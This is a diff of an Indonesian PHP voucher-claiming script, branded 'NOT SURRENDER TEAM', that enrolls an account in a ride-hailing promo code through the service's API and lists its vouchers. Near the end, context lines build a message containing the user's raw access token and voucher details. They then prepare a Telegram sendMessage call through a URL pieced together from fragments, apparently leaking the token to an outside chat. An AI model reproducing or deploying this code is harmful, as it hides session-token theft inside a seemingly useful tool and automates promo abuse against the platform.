@@ -5,14 +5,33 @@ include "functiony.php";
 ulang:
 // function change(){
 os.system('clear');
-echo color("red","* NOT SURRENDER TEAM \n");
+echo color("red","*                                                                                                     
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+  -Ms  .N .syooyo`+smhs-   .dsh/`M`  os yhsssh. Nsssyy`:Nsss -Mo  -m sdssss. myss- dysssy`          
+  -N+d--N m:    ss  d/     .hs- `M`  oy ho..-d/ M:..:m.:m+++ -m+d--m ss   :m ms++- d+..-m:          
+  -N .dyN ho   `h+  d/     --`sy N.  yo hy/oN-  M+/yd` :m... -m .dym ss   oh m/..` ds/sm.           
+  .y   oy  /ssss-   s:     .sss- -sss+  o:  -y` h`  +o -hsss -y   oy +ysss/  ysss: s-  :s`          
+                                                                                                    
+                                                                                                    
+                                                                      /++++.+++/  .+`  +`   :-      
+                                                                      ``M.`:d```  dhy  Md` /Ns      
+                                                                        M` :moo/ smoN+ M/d/dos      
+                                                                        N` :moo//d  `m-N /d`+s      
+                                                                        `   ```        `            
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    \n");
 echo color("red","* NOT SURRENDER TEAM \n");
 echo color("green","* NOT SURRENDER TEAM \n");
 echo color("green","* NOT SURRENDER TEAM \n");
 echo color("blue","* NOT SURRENDER TEAM \n");
 echo color("blue","* NOT SURRENDER TEAM \n");
-echo color("yellow","* NOT SURRENDER TEAM \n");
-echo color("yellow","* NOT SURRENDER TEAM \n");
 echo color("white","* By Region Bandung \n");
 echo color("green","* Time : ".date('[d-m-Y] [H:i:s]')." \n");
         $nama = nama();
@@ -86,21 +105,21 @@ date_default_timezone_set('Asia/Jakarta');
 include_once ('functiony.php');
 $token = $accesstoken;
         {
-        echo color("nevy","\nKlaim Voucher");
-        echo "\n".color("green","* Wait....");
+        echo color("red","~Klaim Voucher~");
+        echo "\n".color("green","* Klaim Voucher Gombret");
         echo "\n".color("blue","* Dagoan heula..");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
         sleep(5);
         }
-        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"HARIJADI7"}');
+        $code1 = request2('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"HARIJADI7"}');
         $message = fetch_value($code1,'"message":"','"');
         if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
-        echo "\n".color("green"," Message: ".$message);
+        echo "\n".color("green","* Message: ".$message);
         goto gocar;
         }else{
-        echo "\n".color("red"," Message: ".$message);
-	      gocar:
+        echo "\n".color("red","* Message: ".$message);
+          gocar:
         sleep(5);
         $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
         $total = fetch_value($cekvoucher,'"total_vouchers":',',');
@@ -138,7 +157,7 @@ $token = $accesstoken;
          $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
          $TOKEN  = "1";
          $chatid = "11";
-         $pesan 	= "♤ \n\n [bung.php] \n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+         $pesan 	= " \n\n [bung.php] \n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
          $method	= "sendMessage";
          $url    = "h" . $TOKEN . "/". $method;
          $post = [
